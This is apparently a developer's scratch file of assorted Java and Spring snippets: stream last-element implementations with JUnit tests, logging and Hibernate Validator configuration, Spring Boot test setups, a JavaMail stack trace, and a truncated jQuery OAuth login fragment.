@DisplayName("last sequential unsized")
void last_sequential_unsized() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed();
    stream = StreamSupport.stream(((Iterable<Long>) stream::iterator).spliterator(), stream.isParallel());
    stream = stream.skip(50_000).peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(9_950_000L);
}

@Test
@DisplayName("last parallel sized")
void last_parallel_sized() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed().parallel();
    stream = stream.skip(50_000).peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(1);
}

@Test
@DisplayName("getLast parallel unsized")
void last_parallel_unsized() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed().parallel();
    stream = StreamSupport.stream(((Iterable<Long>) stream::iterator).spliterator(), stream.isParallel());
    stream = stream.peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(1);
}

@Test
@DisplayName("last parallel unsized with skip")
void last_parallel_unsized_with_skip() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed().parallel();
    stream = StreamSupport.stream(((Iterable<Long>) stream::iterator).spliterator(), stream.isParallel());
    stream = stream.skip(50_000).peek(num -> count.getAndIncrement());

    // Unfortunately unsized parallel streams does not work very well with skip
    //assertThat(Streams.last(stream)).hasValue(expected);
    //assertThat(count).hasValue(1);

    // @Holger implementation gives wrong answer!!
    //assertThat(Streams.getLast(stream)).hasValue(9_950_000L); //!!!
    //assertThat(count).hasValue(1);

    // This is also not a very good answer better
    assertThat(Streams.last(stream)).isEmpty();
    assertThat(count).hasValue(0);
}

public static <T> Optional<T> last(Stream<? extends T> stream) {
    Objects.requireNonNull(stream, "stream");

    Spliterator<? extends T> spliterator = stream.spliterator();

    // Find the last spliterator with estimate size (sized parallel streams)
    if(spliterator.hasCharacteristics(Spliterator.SIZED|Spliterator.SUBSIZED)) {
        // Find the last spliterator on sized streams (parallel streams)
        for (Spliterator<? extends T> prev = spliterator.trySplit(); prev != null; prev = spliterator.trySplit()) {
            if (spliterator.getExactSizeIfKnown() == 0) {
                spliterator = prev;
                break;
            }
        }
    }

    // Find the last element of the spliterator
    //AtomicReference<T> last = new AtomicReference<>();
    //spliterator.forEachRemaining(last::set);

    //return Optional.ofNullable(last.get());

    // A better one that supports native parallel streams
    return (Optional<T>) StreamSupport.stream(spliterator, stream.isParallel())
            .reduce((a, b) -> b);
}



Parallel unsized streams with 'skip' methods are tricky and the @Holger's implementation gives a wrong answer. Also @Holger's implementation is a bit slower because it uses iterators.

An optimisation of @Holger answer:

public static <T> Optional<T> last(Stream<? extends T> stream) {
    Objects.requireNonNull(stream, "stream");

    Spliterator<? extends T> spliterator = stream.spliterator();
    Spliterator<? extends T> lastSpliterator = spliterator;

    // Note that this method does not work very well with:
    // unsized parallel streams when used with skip methods.
    // on that cases it will answer Optional.empty.

    // Find the last spliterator with estimate size
    // Meaningfull only on unsized parallel streams
    if(spliterator.estimateSize() == Long.MAX_VALUE) {
        for (Spliterator<? extends T> prev = spliterator.trySplit(); prev != null; prev = spliterator.trySplit()) {
            lastSpliterator = prev;
        }
    }

    // Find the last spliterator on sized streams
    // Meaningfull only on parallel streams (note that unsized was transformed in sized)
    for (Spliterator<? extends T> prev = lastSpliterator.trySplit(); prev != null; prev = lastSpliterator.trySplit()) {
        if (lastSpliterator.estimateSize() == 0) {
            lastSpliterator = prev;
            break;
        }
    }

    // Find the last element of the last spliterator
    // Parallel streams only performs operation on one element
    AtomicReference<T> last = new AtomicReference<>();
    lastSpliterator.forEachRemaining(last::set);

    return Optional.ofNullable(last.get());
}
Unit testing using junit 5:

@Test
@DisplayName("last sequential sized")
void last_sequential_sized() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed();
    stream = stream.skip(50_000).peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(9_950_000L);
}

@Test
@DisplayName("last sequential unsized")
void last_sequential_unsized() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed();
    stream = StreamSupport.stream(((Iterable<Long>) stream::iterator).spliterator(), stream.isParallel());
    stream = stream.skip(50_000).peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(9_950_000L);
}

@Test
@DisplayName("last parallel sized")
void last_parallel_sized() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed().parallel();
    stream = stream.skip(50_000).peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(1);
}

@Test
@DisplayName("getLast parallel unsized")
void last_parallel_unsized() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed().parallel();
    stream = StreamSupport.stream(((Iterable<Long>) stream::iterator).spliterator(), stream.isParallel());
    stream = stream.peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(1);
}

@Test
@DisplayName("last parallel unsized with skip")
void last_parallel_unsized_with_skip() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed().parallel();
    stream = StreamSupport.stream(((Iterable<Long>) stream::iterator).spliterator(), stream.isParallel());
    stream = stream.skip(50_000).peek(num -> count.getAndIncrement());

    // Unfortunately unsized parallel streams does not work very well with skip
    //assertThat(Streams.last(stream)).hasValue(expected);
    //assertThat(count).hasValue(1);

    // @Holger implementation gives wrong answer!!
    //assertThat(Streams.getLast(stream)).hasValue(9_950_000L); //!!!
    //assertThat(count).hasValue(1);

    // This is also not a very good answer better
    assertThat(Streams.last(stream)).isEmpty();
    assertThat(count).hasValue(0);
}
The only solution to support both's scenarios is to avoid detecting the last spliterator on unsized parallel streams. The consequence is that the solution will perform operations on all elements but it will give always the right answer.

Note that in sequential streams, it will anyway perform operations on all elements.

public static <T> Optional<T> last(Stream<? extends T> stream) {
    Objects.requireNonNull(stream, "stream");

    Spliterator<? extends T> spliterator = stream.spliterator();

    // Find the last spliterator with estimate size (sized parallel streams)
    if(spliterator.hasCharacteristics(Spliterator.SIZED|Spliterator.SUBSIZED)) {
        // Find the last spliterator on sized streams (parallel streams)
        for (Spliterator<? extends T> prev = spliterator.trySplit(); prev != null; prev = spliterator.trySplit()) {
            if (spliterator.getExactSizeIfKnown() == 0) {
                spliterator = prev;
                break;
            }
        }
    }

    // Find the last element of the spliterator
    //AtomicReference<T> last = new AtomicReference<>();
    //spliterator.forEachRemaining(last::set);

    //return Optional.ofNullable(last.get());

    // A better one that supports native parallel streams
    return (Optional<T>) StreamSupport.stream(spliterator, stream.isParallel())
            .reduce((a, b) -> b);
}
With regard to the unit testing for that implementation, the first three tests are exactly the same (sequential & sized parallel). The tests for unsized parallel are here:

@Test
@DisplayName("last parallel unsized")
void last_parallel_unsized() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed().parallel();
    stream = StreamSupport.stream(((Iterable<Long>) stream::iterator).spliterator(), stream.isParallel());
    stream = stream.peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(10_000_000L);
}

@Test
@DisplayName("last parallel unsized with skip")
void last_parallel_unsized_with_skip() throws Exception {
    long expected = 10_000_000L;
    AtomicLong count = new AtomicLong();
    Stream<Long> stream = LongStream.rangeClosed(1, expected).boxed().parallel();
    stream = StreamSupport.stream(((Iterable<Long>) stream::iterator).spliterator(), stream.isParallel());
    stream = stream.skip(50_000).peek(num -> count.getAndIncrement());

    assertThat(Streams.last(stream)).hasValue(expected);
    assertThat(count).hasValue(9_950_000L);
}
--------------------------------------------------------------------------------------------------------
System.lineSeparator()
System.getProperty("line.separator")

rhyme = line1 + "&#10;" + line2;
rhyme = line1 + "&#10;&#13;" + line2;
--------------------------------------------------------------------------------------------------------
if(LOGGER.isInfoEnabled()) {
    String message = MessageFormat.format("Bad experience for user {0} at time {1} while accessing {2}", user, Calendar.getInstance().getTime(), application);
    LOGGER.info(message);
}
--------------------------------------------------------------------------------------------------------
  private static Logger LOGGER = null;

  static {
      InputStream stream = MyClass.class.getClassLoader().
              getResourceAsStream("logging.properties");
      try {
          LogManager.getLogManager().readConfiguration(stream);
          LOGGER= Logger.getLogger(MyClass.class.getName());

      } catch (IOException e) {
          e.printStackTrace();
      }
  }
  
  
  
    private static Logger LOGGER = null;

  static {
      System.setProperty("java.util.logging.SimpleFormatter.format",
              "[%1$tF %1$tT] [%4$-7s] %5$s %n");
      LOGGER = Logger.getLogger(MyClass2.class.getName());
  }
  
  
  
    private static Logger LOGGER = null;

  static {
      Logger mainLogger = Logger.getLogger("com.logicbig");
      mainLogger.setUseParentHandlers(false);
      ConsoleHandler handler = new ConsoleHandler();
      handler.setFormatter(new SimpleFormatter() {
          private static final String format = "[%1$tF %1$tT] [%2$-7s] %3$s %n";

          @Override
          public synchronized String format(LogRecord lr) {
              return String.format(format,
                      new Date(lr.getMillis()),
                      lr.getLevel().getLocalizedName(),
                      lr.getMessage()
              );
          }
      });
      mainLogger.addHandler(handler);
      LOGGER = Logger.getLogger(MyClass3.class.getName());
  }
  
  @Import({MailCacheConfiguration.class})
--------------------------------------------------------------------------------------------------------
mvn archetype:create -DarchetypeGroupId=org.hibernate \
                     -DarchetypeArtifactId=hibernate-validator-quickstart-archetype \
                     -DarchetypeVersion=4.1.0.Final \
                     -DgroupId=com.mycompany 
                     -DartifactId=hv-quickstart
--------------------------------------------------------------------------------------------------------
spring:
  redis:
#    sentinel:
#      master: mc2
#      nodes: mc2-redis-1.paragon-software.com:26379,mc2-redis-2.paragon-software.com:26379,mc2-redis-3.paragon-software.com:26379
    host: localhost
    port: 6379
--------------------------------------------------------------------------------------------------------
@Slf4j
@Component
@RequiredArgsConstructor
public class MailingRecoverer implements KafkaRetryRecoverer {

    private final MailingStatusPublisher mailingStatusPublisher;

    @Override
    public void recover(final ConsumerRecord<?, ?> consumerRecord, final Exception e) {
        final Object value = consumerRecord.value();
        if (value instanceof AnonymizedMailMessage) {
            final AnonymizedMailMessage mailMessage = (AnonymizedMailMessage) value;
            final MailingStatus mailingStatus = new MailingStatus();
            mailingStatus.setTaskId(mailMessage.getTaskId());

            final MailingStatus.Status status = new MailingStatus.Status();
            status.setSuccess(false);
            status.setErrorCode(resolveErrorCode(e));
            mailingStatus.setStatus(status);
            this.mailingStatusPublisher.publish(mailingStatus, mailMessage.getResponseType());
        }
        final String message = getOriginalMessage(e);
        log.error("Max failures reached for: {}, message: {}", consumerRecord, message, e);
    }

    private MailingErrorCode resolveErrorCode(final Exception e) {
        String source = null;
        if (e instanceof ServiceUnavailableException) {
            source = ((ServiceUnavailableException) e).getSource();
        } else if (e instanceof ServiceCallException) {
            source = ((ServiceCallException) e).getSource();
        }
        return MailingErrorCode.findByCode(source);
    }

    private String getOriginalMessage(final Exception e) {
        return (e instanceof ListenerExecutionFailedException) ? e.getCause().getMessage() : e.getMessage();
    }
}
--------------------------------------------------------------------------------------------------------
To help you with the logback-spring.xml, import the build-info.properties into logback-spring.xml as shown below. This allows each key in build-info.properties to be accessed using logback place-holders. (DO NOT CONFUSE THIS WITH SPRING PROPERTY PLACEHOLDERS OR SPRING-EXPRESSIONS)

<?xml version="1.0" encoding="UTF-8" ?>
<configuration>
  <springProperty scope="context" name="appLogTarget" source="app.log.target"
    defaultValue="CONSOLE"/>
  <property resource="META-INF/build-info.properties" />


  <appender name="CONSOLE" class="ch.qos.logback.core.ConsoleAppender">
    <layout class="ch.qos.logback.classic.PatternLayout">
      <Pattern>[${build.version}] %d{ISO8601}" %-5p [%c{3}"] \(%t:%X{}"\) %m%n</Pattern>
    </layout>
  </appender>
 <root>
    <level value="DEBUG"/>
    <appender-ref ref="CONSOLE"/>
  </root>
</xml>
--------------------------------------------------------------------------------------------------------
<constraint-mappings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                     xsi:schemaLocation="http://jboss.org/xml/ns/javax/validation/mapping validation-mapping-1.0.xsd"
                     xmlns="http://jboss.org/xml/ns/javax/validation/mapping">
    <default-package>org.hibernate.validator.quickstart</default-package>
    <bean class="Car" ignore-annotations="true">
        <field name="manufacturer">
            <constraint annotation="javax.validation.constraints.NotNull"/>
        </field>
        <field name="licensePlate">
            <constraint annotation="javax.validation.constraints.NotNull"/>
        </field>
        <field name="seatCount">
            <constraint annotation="javax.validation.constraints.Min">
                <element name="value">2</element>
            </constraint>
        </field>
        <field name="driver">
            <valid/>
        </field>
        <getter name="passedVehicleInspection" ignore-annotations="true">
            <constraint annotation="javax.validation.constraints.AssertTrue">
                <message>The car has to pass the vehicle inspection first</message>
                <groups>
                    <value>CarChecks</value>
                </groups>
                <element name="max">10</element>
            </constraint>
        </getter>
    </bean>
    <bean class="RentalCar" ignore-annotations="true">
        <class ignore-annotations="true">
            <group-sequence>
                <value>RentalCar</value>
                <value>CarChecks</value>
            </group-sequence>
        </class>
    </bean>
    <constraint-definition annotation="org.mycompany.CheckCase" include-existing-validator="false">
        <validated-by include-existing-validators="false">
            <value>org.mycompany.CheckCaseValidator</value>
        </validated-by>
    </constraint-definition>
</constraint-mappings>
--------------------------------------------------------------------------------------------------------
if (spouseIsMale.orElse(false)) {
    System.out.println("There is a male spouse.");
}
filterValue.ifPresentOrElse(value -> {
    if(value){
        method1();
    } else {
        method2();
    }
}, () -> method3());
--------------------------------------------------------------------------------------------------------
 public static void main (String[] args) {
        List<String> list = new ArrayList<>();

        Spliterator<String> s = list.spliterator();

        if(s.hasCharacteristics(Spliterator.ORDERED)){
            System.out.println("ORDERED");
        }
        if(s.hasCharacteristics(Spliterator.DISTINCT)){
            System.out.println("DISTINCT");
        }
        if(s.hasCharacteristics(Spliterator.SORTED)){
            System.out.println("SORTED");
        }
        if(s.hasCharacteristics(Spliterator.SIZED)){
            System.out.println("SIZED");
        }

        if(s.hasCharacteristics(Spliterator.CONCURRENT)){
            System.out.println("CONCURRENT");
        }
        if(s.hasCharacteristics(Spliterator.IMMUTABLE)){
            System.out.println("IMMUTABLE");
        }
        if(s.hasCharacteristics(Spliterator.NONNULL)){
            System.out.println("NONNULL");
        }
        if(s.hasCharacteristics(Spliterator.SUBSIZED)){
            System.out.println("SUBSIZED");
        }
    }
--------------------------------------------------------------------------------------------------------
Stream<Integer> unfolded = StreamUtils.unfold(1, i ->
    (i < 10)
        ? Optional.of(i + 1)
        : Optional.empty());

assertThat(unfolded.collect(Collectors.toList()),
           contains(1, 2, 3, 4, 5, 6, 7, 8, 9, 10));
		   
Stream<String> streamA = Stream.of("A", "B", "C");
Stream<String> streamB  = Stream.of("Apple", "Banana", "Carrot", "Doughnut");

List<String> zipped = StreamUtils.zip(streamA,
                                      streamB,
                                      (a, b) -> a + " is for " + b)
                                 .collect(Collectors.toList());

assertThat(zipped,
           contains("A is for Apple", "B is for Banana", "C is for Carrot"));
		   
Stream<Integer> ints = Stream.of(1,2,3,4,5,6,7,8,9,10);
Stream<Integer> skipped = StreamUtils.skipWhile(ints, i -> i < 4);

List<Integer> collected = skipped.collect(Collectors.toList());

assertThat(collected,
           contains(4, 5, 6, 7, 8, 9, 10));
		   
Stream<Integer> infiniteInts = Stream.iterate(0, i -> i + 1);
Stream<Integer> finiteInts = StreamUtils.takeWhile(infiniteInts, i -> i < 10);

assertThat(finiteInts.collect(Collectors.toList()),
           hasSize(10));
		   

--------------------------------------------------------------------------------------------------------
 public static void main (String[] args) {
     int[] ints = {3,4,6,7};
     Spliterator.OfInt s = Arrays.spliterator(ints);
     s.forEachRemaining((IntConsumer) System.out::println);
 }
--------------------------------------------------------------------------------------------------------
List<Item> operatedList = new ArrayList<>();
itemList.stream()
  .filter(item -> item.isQualified())
  .forEach(item -> {
    item.operate();
    operatedList.add(item);
});
itemList.removeAll(operatedList);
--------------------------------------------------------------------------------------------------------
List<Integer> integers = Lists.mutable.with(1, 2, 3, 4, 5);
int index = Iterate.detectIndex(integers, i -> i > 2);
if (index > -1) {
    integers.remove(index);
}

Assert.assertEquals(Lists.mutable.with(1, 2, 4, 5), integers);
--------------------------------------------------------------------------------------------------------
Map<Boolean, List<String>> classifiedElements = names
    .stream()
    .collect(Collectors.partitioningBy((String e) -> 
      !e.startsWith("A")));
 
String matching = String.join(",",
  classifiedElements.get(true));
String nonMatching = String.join(",",
  classifiedElements.get(false));
--------------------------------------------------------------------------------------------------------
package com.mkyong;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;

public class test {
	public static void main(String[] args){

	try {
		File fileDir = new File("c:\\temp\\test.txt");
			
		BufferedReader in = new BufferedReader(
		   new InputStreamReader(
                      new FileInputStream(fileDir), "UTF8"));
		        
		String str;
		      
		while ((str = in.readLine()) != null) {
		    System.out.println(str);
		}
		        
                in.close();
	    } 
	    catch (UnsupportedEncodingException e) 
	    {
			System.out.println(e.getMessage());
	    } 
	    catch (IOException e) 
	    {
			System.out.println(e.getMessage());
	    }
	    catch (Exception e)
	    {
			System.out.println(e.getMessage());
	    }
	}
}
--------------------------------------------------------------------------------------------------------
@RunWith(SpringRunner.class)
@SpringBootTest(classes = { MyConfigurationPropertiesTest_1.TestConfiguration.class })
@ActiveProfiles("happy-path")
public class MyConfigurationPropertiesTest_1 {
 
    @Autowired
    private MyConfigurationProperties properties;
 
    @Test
    public void should_Populate_MyConfigurationProperties() {
        assertThat(properties.getSomeMandatoryProperty()).isEqualTo("123456");
        assertThat(properties.getSomeOptionalProperty()).isEqualTo("abcdef");
        assertThat(properties.getSomeDefaultProperty()).isEqualTo("overwritten");
    }
 
    @EnableConfigurationProperties(MyConfigurationProperties.class)
    public static class TestConfiguration {
        // nothing
    }
}
 
application-happy-path.yml:
    my:
      properties:
        some_mandatory_property: "123456"
        some_optional_property: "abcdef"
        some_default_property: "overwritten"
--------------------------------------------------------------------------------------------------------
@TestPropertySource(properties={"spring.autoconfigure.exclude=comma.seperated.ClassNames,com.example.FooAutoConfiguration"})
@EnableAutoConfiguration(exclude = IntegrationAutoConfiguration.class)

javax.mail.StoreClosedException: * BYE JavaMail Exception: java.io.IOException: Connection dropped by server?
	at com.sun.mail.imap.IMAPFolder.throwClosedException(IMAPFolder.java:3732)
	at com.sun.mail.imap.IMAPFolder.doCommand(IMAPFolder.java:3866)
	at com.sun.mail.imap.IMAPFolder.exists(IMAPFolder.java:590)
	at org.springframework.integration.mail.AbstractMailReceiver.openFolder(AbstractMailReceiver.java:324)
	at org.springframework.integration.mail.ImapMailReceiver.waitForNewMessages(ImapMailReceiver.java:170)
	at org.springframework.integration.mail.ImapIdleChannelAdapter$IdleTask.run(ImapIdleChannelAdapter.java:289)
	at org.springframework.integration.mail.ImapIdleChannelAdapter$ReceivingTask.run(ImapIdleChannelAdapter.java:254)
	at org.springframework.scheduling.support.DelegatingErrorHandlingRunnable.run(DelegatingErrorHandlingRunnable.java:54)
	at org.springframework.scheduling.concurrent.ReschedulingRunnable.run(ReschedulingRunnable.java:93)
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511)
	at java.util.concurrent.FutureTask.run(FutureTask.java:266)
	at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$201(ScheduledThreadPoolExecutor.java:180)
	at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:293)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at java.lang.Thread.run(Thread.java:748)
	
java.lang.IllegalStateException: Failure in 'idle' task. Will resubmit.
	at org.springframework.integration.mail.ImapIdleChannelAdapter$IdleTask.run(ImapIdleChannelAdapter.java:305)
	at org.springframework.integration.mail.ImapIdleChannelAdapter$ReceivingTask.run(ImapIdleChannelAdapter.java:254)
	at org.springframework.scheduling.support.DelegatingErrorHandlingRunnable.run(DelegatingErrorHandlingRunnable.java:54)
	at org.springframework.scheduling.concurrent.ReschedulingRunnable.run(ReschedulingRunnable.java:93)
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511)
	at java.util.concurrent.FutureTask.run(FutureTask.java:266)
	at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$201(ScheduledThreadPoolExecutor.java:180)
	at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:293)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at java.lang.Thread.run(Thread.java:748)
Caused by: javax.mail.StoreClosedException: * BYE JavaMail Exception: java.io.IOException: Connection dropped by server?
	at com.sun.mail.imap.IMAPFolder.throwClosedException(IMAPFolder.java:3732)
	at com.sun.mail.imap.IMAPFolder.doCommand(IMAPFolder.java:3866)
	at com.sun.mail.imap.IMAPFolder.exists(IMAPFolder.java:590)
	at org.springframework.integration.mail.AbstractMailReceiver.openFolder(AbstractMailReceiver.java:324)
	at org.springframework.integration.mail.ImapMailReceiver.waitForNewMessages(ImapMailReceiver.java:170)
	at org.springframework.integration.mail.ImapIdleChannelAdapter$IdleTask.run(ImapIdleChannelAdapter.java:289)
	... 10 common frames omitted
--------------------------------------------------------------------------------------------------------
@Configuration
@Profile("dev")
public class StandaloneDataConfig {

	@Bean
	public DataSource dataSource() {
		return new EmbeddedDatabaseBuilder()
			.setType(EmbeddedDatabaseType.HSQL)
			.addScript("classpath:com/bank/config/sql/schema.sql")
			.addScript("classpath:com/bank/config/sql/test-data.sql")
			.build();
	}
}
--------------------------------------------------------------------------------------------------------
package com.example;

@RunWith(SpringJUnit4ClassRunner.class)
// ApplicationContext will be loaded from the static inner ContextConfiguration class
@ContextConfiguration(loader=AnnotationConfigContextLoader.class)
public class OrderServiceTest {

    @Configuration
    static class ContextConfiguration {

        // this bean will be injected into the OrderServiceTest class
        @Bean
        public OrderService orderService() {
            OrderService orderService = new OrderServiceImpl();
            // set properties, etc.
            return orderService;
        }
    }

    @Autowired
    private OrderService orderService;

    @Test
    public void testOrderService() {
        // test the orderService
    }
}
--------------------------------------------------------------------------------------------------------
import com.paragon.microservices.crmmailadapter.test.annotation.SpringBootTestConfiguration;
import org.junit.Ignore;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.web.client.TestRestTemplate;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.test.context.junit4.SpringRunner;

import static org.junit.Assert.assertEquals;

@RunWith(SpringRunner.class)
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
@SpringBootTestConfiguration
public class ActuatorInfoTest {

    @Autowired
    private TestRestTemplate restTemplate;

    @Ignore
    @Test
    public void whenGetInfo_thenReturns200() {
        final ResponseEntity<String> responseEntity = this.restTemplate.getForEntity("/actuator/info", String.class);
        assertEquals(HttpStatus.OK, responseEntity.getStatusCode());
    }

    @Ignore
    @Test
    public void whenFeatures_thenReturns200() {
        final ResponseEntity<String> responseEntity = this.restTemplate.getForEntity("/actuator/features", String.class);
        assertEquals(HttpStatus.OK, responseEntity.getStatusCode());
    }
}
--------------------------------------------------------------------------------------------------------
ArgumentCaptor<MyFunctionalInterface> lambdaCaptor = ArgumentCaptor.forClass(MyFunctionalInterface.class);

verify(bar).useLambda(lambdaCaptor.capture());

// Not retrieve captured arg (which is reference to lamdba).
MyFuntionalRef usedLambda = lambdaCaptor.getValue();

// Now you have reference to actual lambda that was passed, validate its behavior.
verifyMyLambdaBehavior(usedLambda);
--------------------------------------------------------------------------------------------------------
@RunWith(SpringRunner.class)
@WebMvcTest(CarServiceController.class)
public class CarServiceControllerTests {

    @Autowired
    private MockMvc mvc;

    @MockBean
    private CarService carService;

    @Test
    public void getCarShouldReturnCarDetails() {
        given(this.carService.schedulePickup(new Date(), new Route());)
            .willReturn(new Date());

        this.mvc.perform(get("/schedulePickup")
            .accept(MediaType.JSON)
            .andExpect(status().isOk());
    }
}
--------------------------------------------------------------------------------------------------------
@Configuration
public class RetryTemplateBeanPostProcessor implements BeanPostProcessor {

    public static final String DEFAULT_RETRY_TEMPLATE_BEAN_NAME = "retryTemplate";

    @Nullable
    @Override
    public Object postProcessAfterInitialization(final Object bean, final String beanName) throws BeansException {
        if (StringUtils.equalsIgnoreCase(beanName, DEFAULT_RETRY_TEMPLATE_BEAN_NAME)) {
            ((RetryTemplate) bean).setThrowLastExceptionOnExhausted(true);
        }
        return bean;
    }
}
--------------------------------------------------------------------------------------------------------
@SpringBootApplication
@Import({ProcessExecutorConfig.class})
public class App {
 
	public static void main(String[] args) {
		SpringApplication app = new SpringApplication(App.class);
		app.addInitializers(new CustomAppCtxInitializer());
		ConfigurableApplicationContext ctx = app.run();
	}
 
	private static class CustomAppCtxInitializer
			implements ApplicationContextInitializer<GenericApplicationContext> {
 
		@Override
		public void initialize(GenericApplicationContext applicationContext) {
			applicationContext
					.getDefaultListableBeanFactory()
					.setAllowBeanDefinitionOverriding(false);
		} 
	}
}
--------------------------------------------------------------------------------------------------------
spring.main.allow-bean-definition-overriding=true
--------------------------------------------------------------------------------------------------------
  /*
   *           N777777777NO
   *         N7777777777777N
   *        M777777777777777N
   *        $N877777777D77777M
   *       N M77777777ONND777M
   *       MN777777777NN  D777
   *     N7ZN777777777NN ~M7778
   *    N777777777777MMNN88777N
   *    N777777777777MNZZZ7777O
   *    DZN7777O77777777777777
   *     N7OONND7777777D77777N
   *      8$M++++?N???$77777$
   *       M7++++N+M77777777N
   *        N77O777777777777$                              M
   *          DNNM$$$$777777N                              D
   *         N$N:=N$777N7777M                             NZ
   *        77Z::::N777777777                          ODZZZ
   *       77N::::::N77777777M                         NNZZZ$
   *     $777:::::::77777777MN                        ZM8ZZZZZ
   *     777M::::::Z7777777Z77                        N++ZZZZNN
   *    7777M:::::M7777777$777M                       $++IZZZZM
   *   M777$:::::N777777$M7777M                       +++++ZZZDN
   *     NN$::::::7777$$M777777N                      N+++ZZZZNZ
   *       N::::::N:7$O:77777777                      N++++ZZZZN
   *       M::::::::::::N77777777+                   +?+++++ZZZM
   *       8::::::::::::D77777777M                    O+++++ZZ
   *        ::::::::::::M777777777N                      O+?D
   *        M:::::::::::M77777777778                     77=
   *        D=::::::::::N7777777777N                    777
   *       INN===::::::=77777777777N                  I777N
   *      ?777N========N7777777777787M               N7777
   *      77777$D======N77777777777N777N?         N777777
   *     I77777$$$N7===M$$77777777$77777777$MMZ77777777N
   *      $$$$$$$$$$$NIZN$$$$$$$$$M$$7777777777777777ON
   *       M$$$$$$$$M    M$$$$$$$$N=N$$$$7777777$$$ND
   *      O77Z$$$$$$$     M$$$$$$$$MNI==$DNNNNM=~N
   *   7 :N MNN$$$$M$      $$$777$8      8D8I
   *     NMM.:7O           777777778
   *                       7777777MN
   *                       M NO .7:
   *                       M   :   M
   *                            8
   */

--------------------------------------------------------------------------------------------------------
    public static void main(String[] args) {
        final byte[] expected = "fo".getBytes(StandardCharsets.US_ASCII);
        byte[] dst = new byte[expected.length];
        Base64.getMimeDecoder().decode("Zm8=\r\n".getBytes(StandardCharsets.US_ASCII), dst);
    }
--------------------------------------------------------------------------------------------------------
val file = File(Uri.parse(resources.openRawResource(R.raw.rec1).toString()).toString())
        var encodedBase64: String? = null
        try {
            val fileInputStreamReader = FileInputStream(file)
            val bytes = ByteArray(file.length().toInt())
            fileInputStreamReader.read(bytes)
            val result = Base64.encodeToString(bytes, Base64.DEFAULT)

            println("result--" + result)
        } catch (e: FileNotFoundException) {
            e.printStackTrace()
        } catch (e: IOException) {
            e.printStackTrace()
        }
--------------------------------------------------------------------------------------------------------
@Configuration
@ConditionalOnExpression(
    "${module.enabled:true} and ${module.submodule.enabled:true}"
)
class SubModule {
  ...
}
--------------------------------------------------------------------------------------------------------
@SpringBootApplication
public class SpringBootComponentScanApp {
    private static ApplicationContext applicationContext;
 
    @Bean
    public ExampleBean exampleBean() {
        return new ExampleBean();
    }
 
    public static void main(String[] args) {
        applicationContext = SpringApplication.run(SpringBootComponentScanApp.class, args);
        checkBeansPresence("cat", "dog", "rose", "exampleBean", "springBootComponentScanApp");
 
    }
 
    private static void checkBeansPresence(String... beans) {
        for (String beanName : beans) {
            System.out.println("Is " + beanName + " in ApplicationContext: " + 
              applicationContext.containsBean(beanName));
        }
    }
}
--------------------------------------------------------------------------------------------------------
var oauthToken = null;

function login() {
    var userLogin = $('#loginField').val();
    var userPassword = $('#passwordField').val();
    console.log ( '#someButton was clicked' );
    $.post({
        url: 'http://localhost:8080/app/rest/v2/oauth/token',
        headers: {
            'Authorization': 'Basic Y2xpZW50OnNlY3JldA==',
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        dataType: 'json',
